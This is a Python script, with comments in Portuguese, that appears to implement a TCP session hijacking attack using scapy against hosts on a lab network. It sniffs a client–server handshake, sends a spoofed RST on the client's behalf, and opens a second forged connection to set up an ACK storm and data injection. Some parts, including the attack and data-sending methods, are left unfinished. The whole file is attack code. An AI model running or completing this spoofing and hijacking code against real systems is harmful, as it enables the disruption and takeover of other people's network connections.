#!/usr/bin/python3
# -*- coding: utf-8 -*-
from multiprocessing import Queue
from threading import Thread
from scapy.all import *


ip_client = '192.168.1.156' # '192.168.56.102'
ip_server = '192.168.1.158' # '192.168.56.101'
'''
FIN = 0x01
SYN = 0x02
RST = 0x04
PSH = 0x08
ACK = 0x10
URG = 0x20
ECE = 0x40
CWR = 0x80
'''


class State():
    WAITING_CONNECTION      = 0
    OPENING_SEC_CONNECTION  = 1
    ACK_STORM               = 2
    SEND_DATA               = 3
    CONTINUE_CONNECTION     = 4
    FINALIZE_CONNECTION     = 5

    
class Host():
    
    def __init__(self, ip, dst_ip=None, port=-1, dst_port=-1, win=None):
        self.ip = ip
        self.dst_ip = dst_ip
        self.port = port
        self.dst_port = dst_port
        self.win = win
        self.seq = 1009872899
        self.ack = 0
    
    
    def set_ip(self, ip):
        self.ip = ip
    
    
    def set_ports(self, port, dst_port):
        self.port = port
        self.dst_port = dst_port
    
    
    def set_win(self, win):
        self.win = win
    
    
    def refresh(self, pkt):
        self.win = pkt[TCP].window
        self.seq = pkt[TCP].seq
        self.ack = pkt[TCP].ack
        
        return True
    
    
    def is_same_params(self, pkt):
        _check = True
        if pkt[TCP].window != self.win:
            _check = False
        if pkt[TCP].seq != self.seq:
            _check = False
        if pkt[TCP].ack != self.ack:
            _check = False
        
        return _check
    
    
    def get_packet(self):
        _ip     = IP(src=self.ip, dst=self.dst_ip)
        _tcp    = TCP(sport=self.port, dport=self.dst_port, seq=self.seq+1, ack=self.ack)
        _pkt = _ip/_tcp
        
        return _pkt
    
    
class Injector():
    
    
    def __init__(self, target_ip, wtever_ip, verbose=False):
        self.verbose = verbose
        # Connection 1
        self.wtever = Host(wtever_ip, dst_ip=target_ip)
        self.target = Host(target_ip, dst_ip=wtever_ip)
        # Connection 2
        self.fake_wtever = Host(wtever_ip, dst_ip=target_ip)
        self.well_target = Host(target_ip, dst_ip=wtever_ip)
        
        self._state = State.WAITING_CONNECTION
        #
        self._iface = 'enp0s3'
        self.__refreshed = False
        self.__buf_pkts = Queue()
        
        #__parse_pkt
        self.__storm_count = 0
        self.__fake_pkt = list()
        self.__reached_pkts = 0
    

    def __send_to_target(self, data):
        _ip     = IP( src=self.wtever.ip, dst=self.target.ip )
        _tcp    = TCP( sport=self.wtever.port, dport=self.target.port )
        
        self.__refreshed = False
    
    
    def __send_fake(self, pkt):
        # Calculate checksum
        del pkt.chksum
        pkt.show2()    # POG to recalc checksum
        self.__fake_pkt.append(pkt)
        
        send(pkt)
    
    def __initiate_second_connection(self):
        print("[-] Iniciando segunda conexão.")
        self._state = State.OPENING_SEC_CONNECTION
        
        # Envia RST para o target
        _pkt = self.wtever.get_packet()
        _pkt[TCP].flags = 0x04  # RST
        #_pkt[TCP].ack = self.target.seq + 1 # Must be 0
        _pkt[TCP].sport = _pkt[TCP].sport+1
        self.__send_fake(_pkt)
        
        # Envia solicitação para nova conexão
        _pkt = self.fake_wtever.get_packet()
        del _pkt.ack
        _pkt[TCP].flags = 0x02  # SYN
        
        self.__send_fake(_pkt)
    
    
    def __establish_second_connection(self):
        if self.verbose: print("[V] Estabelecendo segunda conexão 3wHS.")
        # Envia terceiro pacote do handshake
        _pkt = self.fake_wtever.get_packet()
        _pkt[TCP].flags = 0x10  # ACK
        _pkt[TCP].ack = self.well_target.seq + 1
        
        self.__send_fake(_pkt)
        
        self._state = State.ACK_STORM
    
    
    def __waiting_connection(self, pkt):
        ############################################################
        # 1 - Se o pacote é uma abertura de conexão com o target
        if pkt[IP].dst == self.target.ip and pkt[TCP].flags == 2:
            # Preencha portas de origem e destino
            self.target.set_ports( pkt[TCP].dport, pkt[TCP].sport)
            self.wtever.set_ports( pkt[TCP].sport, pkt[TCP].dport)
            
            # Será o mesmo para a segunda conexão
            self.well_target.set_ports( pkt[TCP].dport, pkt[TCP].sport )
            self.fake_wtever.set_ports( pkt[TCP].sport, pkt[TCP].dport )
            
            # Atualiza Window, Sequence e Ack
            self.wtever.refresh(pkt)
            
            # Garante que o refreshed está com valor correto
            self.__refreshed = True
            print("[-] Nova conexão com o target.")
        
        ############################################################
        # 2 - Se é uma resposta a abertura de sessão (SYN+ACK)
        elif pkt[IP].dst == self.wtever.ip and pkt[TCP].flags == 18:
            # Atualiza Window, Sequence e Ack
            self.target.refresh(pkt)
            
            self.__initiate_second_connection()
            
        ############################################################
        # 3 -Se o pacote estiver enviando dados para o target
        elif pkt[IP].dst == self.target.ip and pkt[TCP].payload:
            if self.verbose: print("[V] Pacote com dados recebido.")
            # Atualiza
            self.wtever.refresh(pkt)
            
            # Precaução, já inicia armazenagem de pacotes.
            #self.__buf_pkts.put(pkt)
            
        else:
            # unknown case
            pass
    
    
    def __parse_pkt(self, pkt):
        '''
        '''
        if TCP not in pkt:
            return 0
        self.__waiting_connection(pkt)
    
    
    def sniff(self):
        '''
        '''
        _filter = "(src {} and dst {}) or (src {} and dst {})".format(self.wtever.ip, self.target.ip, self.target.ip,  self.wtever.ip)
        sniff(iface = self._iface, count = 100,
            filter = _filter,
            prn = self.__parse_pkt)
    
    
    def atack(self):
        pass
    
    
    def run(self):
        '''
        '''
        self.sniff()
        #t1 = threading.Thread(target=self.sniff)
        #t2 = threading.Thread(target=self.atack)
        
        #t1.start()
        #t2.start()
        
        #t1.join()
        #t2.join()
        
        
if __name__ == '__main__':
    host_only_my = '192.168.56.110'
    host_only_server = '192.168.56.101'
    host_only_client = '192.168.56.102'
    host_only_atack = '192.168.56.103'
    #
    injector = Injector(wtever_ip=host_only_client, target_ip=host_only_server, verbose=True)
    injector.run()
